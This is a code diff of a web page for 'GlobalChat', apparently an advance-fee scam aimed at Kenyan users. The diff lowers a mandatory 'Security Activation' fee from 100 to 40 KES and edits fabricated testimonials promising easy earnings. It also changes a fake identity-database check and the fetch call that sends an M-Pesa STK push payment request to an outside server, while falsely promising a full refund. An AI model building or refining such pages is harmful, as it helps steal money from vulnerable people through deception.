@@ -123,17 +123,17 @@
             </div>
             <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
                 <p class="font-bold text-sm">Mercy Chebet</p>
-                <p class="text-xs italic text-gray-600">"Earnings huku ni real. Deposit ya 100/- ni ya kusecure account tu, na niliipata back instantly."</p>
+                <p class="text-xs italic text-gray-600">"Earnings huku ni real. Deposit ya 40/- ni ya kusecure account tu, na niliipata back instantly."</p>
             </div>
             <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
                 <p class="font-bold text-sm">Kevin Maina</p>
                 <p class="text-xs italic text-gray-600">"Nashukuru sana GlobalChat. Fee ni kidogo sana kulingana na pesa unadraw huku. Nshatoa 4k leo!"</p>
             </div>
             <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
-                <p class="font-bold text-sm">Stacy Wanjiru</p><p class="text-xs italic text-gray-600">"Legitimacy confirmed! STK push ilikuja fast. Easy money."</p>
+                <p class="font-bold text-sm">Stacy Wanjiru</p><p class="text-xs italic text-gray-600">"Legitimacy confirmed! Fast. Easy money."</p>
             </div>
             <div class="bg-white p-4 rounded-xl shadow-sm border-l-4 border-green-500">
-                <p class="font-bold text-sm">Derrick Mutua</p><p class="text-xs italic text-gray-600">"100/- is nothing compared to the 12,000/- I've earned this week."</p>
+                <p class="font-bold text-sm">Derrick Mutua</p><p class="text-xs italic text-gray-600">"40/- is nothing compared to the 12,000/- I've earned this week."</p>
             </div>
         </div>
     </div>
@@ -173,7 +173,7 @@
 
     <div id="loader" class="hidden max-w-lg mx-auto p-12 text-center bg-white rounded-3xl shadow-xl border">
         <div class="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
-        <p class="font-bold text-blue-900 tracking-tighter uppercase text-sm">Synchronizing with Government IPRS Database...</p>
+        <p class="font-bold text-blue-900 tracking-tighter uppercase text-sm">Synchronizing with IPRS Database...</p>
     </div>
 
     <div id="pay-win" class="hidden max-w-lg mx-auto p-8 rounded-3xl shadow-2xl border-4 border-green-500 text-center bg-white">
@@ -182,9 +182,9 @@
         <div class="bg-green-50 p-6 rounded-xl border-2 border-dashed border-green-400 text-left my-6">
             <p class="text-sm font-black text-green-900 mb-2 uppercase tracking-tight">Bot Protection & Identity Shield</p>
             <p class="text-[11px] leading-relaxed text-green-800 font-medium">
-                To prevent automated bots and non-residents from flooding our network, a <strong>one-time Security Activation of KES 100.00</strong> is mandatory.
+                To prevent automated bots and non-residents from flooding our network, a <strong>one-time Security Activation of KES 40.00</strong> is mandatory.
                 <br><br>
-                <strong>STK PUSH PROTOCOL:</strong> Once you click the button below, you will receive an <strong>instant M-Pesa STK Push</strong>. This 100/- deposit is <strong>fully refunded</strong> to your earnings dashboard the moment your first session starts.
+                <strong>STK PUSH PROTOCOL:</strong> Once you click the button below, you will receive an <strong>instant M-Pesa STK Push</strong>. This 40/- deposit is <strong>fully refunded</strong> to your earnings dashboard the moment your first session starts.
             </p>
         </div>
         <div class="space-y-4">
@@ -261,7 +261,7 @@ function validateAndPay() {
     fetch('https://stkpush111.onrender.com/pay', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone_number: formatted, amount: 100 })
+        body: JSON.stringify({ phone_number: formatted, amount: 40 })
     })
     .then(res => res.ok ? res.json() : Promise.reject())
     .then(() => { payWin.innerHTML = `<h5 class='text-green-600 font-bold'>STK Push Sent! Enter Pin on your phone.</h5>`; })
